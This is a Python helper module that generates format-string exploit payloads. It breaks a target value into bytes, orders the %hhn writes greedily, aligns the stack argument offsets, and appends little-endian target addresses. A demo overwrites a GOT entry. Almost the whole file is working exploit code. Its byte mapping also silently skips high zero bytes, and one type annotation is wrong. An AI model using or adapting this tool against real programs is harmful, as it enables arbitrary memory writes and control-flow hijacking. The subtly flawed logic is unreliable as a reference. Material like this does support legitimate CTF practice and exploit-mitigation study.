def byte_map(word: int, addr: int) -> list[tuple[int, int]]:
    """
    Convert a word (dword/qword) into byte map
    Returns list of (address, byte_value)
    """
    byte_mp = []
    while word != 0:
        byte_mp.append((addr, word & 0xFF))
        word >>= 8
        addr += 1
    return byte_mp


def sort_writes(byte_map: list[tuple[int, int]], written: int) -> list[tuple[int, int]]:
    """
    Sorts the byte_map for greedy format string writes.

    byte_map: list of (address, byte_value)
    written: number of bytes already printed before the format string

    Returns: list of (address, byte_value,padd_val) sorted for minimal padding
    """
    remaining = byte_map.copy()
    result = []
    current_written = written

    while remaining:
        # Compute needed padding for each remaining byte
        pad_list = [
            (addr, val, (val - (current_written % 256)) % 256)
            for addr, val in remaining
        ]
        # Pick the byte that requires minimal padding
        addr, val, pad = min(pad_list, key=lambda x: x[2])
        result.append((addr, val, pad))
        current_written += pad  # update written bytes
        # Remove the chosen byte from remaining
        remaining = [x for x in remaining if x[0] != addr]

    return result


def place_address(
    fmt_str: str, writes: list[tuple[int, int, int]], word_size: int = 8
) -> bytes:
    """
    Append the target addresses to the end of a format string payload.

    Parameters:
            fmt_str (str): The format string portion (with %c / %hhn specifiers).
            writes (list[tuple[int,int,int]]): A list of (address, value, padding)
                    tuples, typically produced by `sort_writes`.
                    Only the address field is used here.
            word_size (int): Size of a pointer in bytes (8 for x86_64, 4 for x86).

    Returns:
            bytes: The completed payload consisting of the original format string
                   followed by the addresses encoded in little-endian form.

    Notes:
            - Addresses are placed sequentially at the end of the format string.
            - These addresses correspond to the `%n` arguments inside fmt_str.
            - `word_size` ensures correct alignment for the architecture.
    """
    for addr, _, _ in writes:
        fmt_str += addr.to_bytes(word_size, "little")
    return fmt_str


def fmt_str_payload(writes: list[tuple[int, int, int]], offset: int) -> bytes:
    """
    Construct the format string control portion (without addresses).

    Parameters:
            writes (list[tuple[int,int,int]]): A list of (address, value, padding)
                    tuples, sorted by greedy padding order from `sort_writes`.
                    - `address` is ignored here, only `pad` is used.
                    - `pad` tells how many characters to print before the %hhn.
            offset (int): The stack offset of the first address argument.
                    Each subsequent write increments this offset.

    Returns:
            bytes: The raw format string, e.g. b"%125c%9$hhn%36c%10$hhn..."

    Notes:
            - Each padding is emitted as `%<pad>c` if nonzero.
            - Each write emits a `%<index>$hhn` corresponding to its address slot.
            - The result must later be combined with actual addresses via
              `place_address`.
    """
    fmt_str = b""
    for i, (addr, _, pad) in enumerate(writes):
        if pad != 0:
            fmt_str += f"%{pad}c".encode()
        fmt_str += f"%{offset + i}$hhn".encode()
    return fmt_str


def converge_payload(
    writes: list[tuple[int, int, int]],
    offset_bytes: int,
    offset: int,
    word_size: int = 8,
) -> bytes:
    """
    Iteratively build a converged format string payload with correct alignment.

    Parameters:
            writes (list[tuple[int,int,int]]): Sorted write plan from `sort_writes`.
            offset_bytes (int): Number of bytes already written before the format
                    string begins (affects how the stack offset is calculated).
            offset (int): Base stack offset where the first argument will be read.
            word_size (int): Architecture pointer size in bytes (8 for x64, 4 for x86).

    Returns:
            bytes: Fully converged payload including control string + aligned addresses.

    Algorithm:
            1. Start with an empty payload.
            2. Compute the predicted stack argument offset (`data_offset`) based on
               the current payload length + already written bytes.
            3. Rebuild the format string with updated `$` indices using
               `fmt_str_payload`.
            4. Add padding (A's) to align the string length so that addresses will
               start on a `word_size` boundary.
            5. Repeat until the computed offset matches the actual alignment.
            6. Once converged, append the real addresses with `place_address`.

    Raises:
            RuntimeError: If the payload cannot converge within the iteration limit.

    Notes:
            - This function is crucial: it ensures the `$` indices and address
              placements match up exactly with how the format string will be
              interpreted at runtime.
            - Without convergence, the wrong stack slots would be written to.
    """
    fmt = b""
    for _ in range(1000000):
        # predict where addresses will begin
        data_offset = (len(fmt) + offset_bytes) // word_size
        # generate control string + address section
        fmt_str = fmt_str_payload(writes, offset + data_offset)
        # add padding so that addresses align with word boundary
        padding = (-(len(fmt_str) + offset_bytes)) % word_size
        fmt_str += b"A" * padding
        fmt = fmt_str
        # check if converged: are we on correct boundary?
        if len(fmt) + offset_bytes == data_offset * word_size:
            return place_address(fmt, writes, word_size)
    raise RuntimeError("Failed to converge payload")


if __name__ == "__main__":
    word = 0x400837  # test word to write
    base_addr = 0x601040  # GOT entry
    written = 27  # assume 27 bytes already written
    start_offset = 10  # where our first argument begins
    word_size = 8  # x64

    # Step 1: Byte map
    print("Byte map:")
    bm = byte_map(word, base_addr)
    for addr, val in bm:
        print(hex(addr), hex(val))

    # Step 2: Greedy order
    print("\nGreedy order:")
    sw = sort_writes(bm, written)
    for addr, val, pad in sw:
        print(hex(addr), val, pad)

    # Step 3: Format string without convergence
    print("\nFormat string payload (no addresses):")
    print(fmt_str_payload(sw, start_offset))

    # Step 4: Converged full payload
    print("\nConverged payload:")
    payload = converge_payload(
        sw, offset_bytes=written, offset=start_offset, word_size=word_size
    )
    print(payload)
